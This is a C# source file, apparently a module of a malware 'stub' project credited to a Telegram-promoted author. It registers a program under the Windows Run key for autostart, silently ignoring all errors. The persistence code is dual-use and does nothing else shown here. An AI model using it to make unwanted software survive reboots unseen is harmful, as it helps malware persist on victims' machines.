/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;

namespace stubOnion
{
    class Registration
    {
        private const string REG = @"Software\Microsoft\Windows\CurrentVersion\Run";

        public static void Inizialize(bool enable, string name, string localpath)
        {
            try
            {
                RegistryHive registryHive = RunCheck.IsAdmin ? RegistryHive.LocalMachine : RegistryHive.CurrentUser;
                RegistryView registryView = RunCheck.IsWin64 ? RegistryView.Registry64 : RegistryView.Registry32;

                using (var registry = RegistryKey.OpenBaseKey(registryHive, registryView))
                {
                    using (RegistryKey runKey = registry.OpenSubKey(REG, RunCheck.IsWin64))
                    {
                        if (!enable)
                        {
                            try
                            {
                                runKey?.DeleteValue(name);
                            }
                            catch { }
                        }
                        else
                        {
                            try
                            {
                                runKey?.SetValue(name, localpath);
                            }
                            catch { }
                        }
                    }
                }
            }
            catch { }
        }
    }

    public class RunCheck
    {
        public static bool IsAdmin => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        public static bool IsWin64 => Environment.Is64BitOperatingSystem ? true : false;
        public static bool StartWin_xSixtyFour() { if (Environment.Is64BitOperatingSystem) { return true; } return false; }

        public static bool IsUserAdministrator()
        {
            try { return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator); } catch { return false; }
        }

    }
}
